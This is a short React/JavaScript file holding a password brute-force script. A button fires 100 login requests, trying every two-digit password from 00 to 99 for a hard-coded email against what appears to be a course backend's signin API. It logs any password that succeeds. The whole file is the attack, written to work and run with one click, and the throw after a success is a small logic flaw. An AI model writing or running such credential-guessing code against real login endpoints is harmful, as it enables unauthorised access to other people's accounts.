export function getPassword(password,email){
  fetch('https://tms-js-pro-back-end.herokuapp.com/api/users/signin', {
    method: 'POST',
    headers: {
      Accept: 'application/json',
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      email,
      password,
    }),
  }).then((response) => {
    if (response.ok) {
        console.log('MY PASSWORD: ', password);
    }
    throw Error;
  }).catch((err)=>{
      console.log('err',err);
  })
}

export default function getMyPassword() {
  const myEmail = 'olgab@mail.com';
  return (
    <button type="button" onClick={() => {
      for (let index = 0; index < 100; index += 1) {
        const givePassword = index.toString().padStart(2, 0);
        getPassword(givePassword, myEmail);
      }
    }}>
      Скажи мне пароль немедленно
    </button>
  );
}

